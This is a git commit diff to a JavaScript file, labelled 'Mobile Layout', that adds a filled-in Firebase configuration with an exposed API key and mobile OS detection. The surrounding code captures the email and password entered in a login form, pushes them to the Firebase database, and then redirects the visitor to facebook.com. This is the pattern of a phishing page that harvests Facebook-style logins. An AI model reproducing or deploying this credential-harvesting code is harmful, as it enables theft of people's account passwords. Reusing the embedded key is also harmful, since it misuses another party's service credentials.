0fabc38a34651935fbbaaa0a514e14a6e5ce5518
Augusto Marinaro <marinaro.augusto@gmail.com>
2017-03-21 02:36:23 -0300

    Mobile Layout

--- js/app.js
+++ js/app.js
@@ -1,14 +1,30 @@
 //Add here the config to Firebase
 var config = {
-    apiKey: "XXXXX",
-    authDomain: "XXXXXX.firebaseapp.com",
-    databaseURL: "XXXXXXX.firebaseio.com",
-    storageBucket: "XXXXXX.appspot.com",
-    messagingSenderId: "XXXXXXX"
+    apiKey: "AIzaSyAPexBtTYZJnrCtpoqSaR0eBi4XneYk27U",
+    authDomain: "tasker-bb7ea.firebaseapp.com",
+    databaseURL: "https://tasker-bb7ea.firebaseio.com",
+    storageBucket: "tasker-bb7ea.appspot.com",
+    messagingSenderId: "732939116415"
 };
 var app = firebase.initializeApp(config);
 var ref = app.database().ref("conver/data/grid/list/users")
-
+function getMobileOperatingSystem() {
+    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    if (/windows phone/i.test(userAgent)) {
+        return "Windows Phone";
+    }
+    if (/android/i.test(userAgent)) {
+        return "Android";
+    }
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return "iOS";
+    }
+    return "unknown";
+}
+if (getMobileOperatingSystem() === "Windows Phone") $('.windows').css('display','block');
+if (getMobileOperatingSystem() === "iOS") $('.iphone').css('display','block');
+if (getMobileOperatingSystem() === "Android") $('.android').css('display','block');
+console.log(getMobileOperatingSystem());
 $('.login-form').submit(function (e) {
     var $this = $(this),
         $email= $this.find('input[type=email]').val(),
@@ -17,7 +33,6 @@ $('.login-form').submit(function (e) {
             email: $email,
             pass : $pass
         };
-
     ref.push($data).then(function(response){
        window.location = 'http://facebook.com';
     }).catch(function(err){
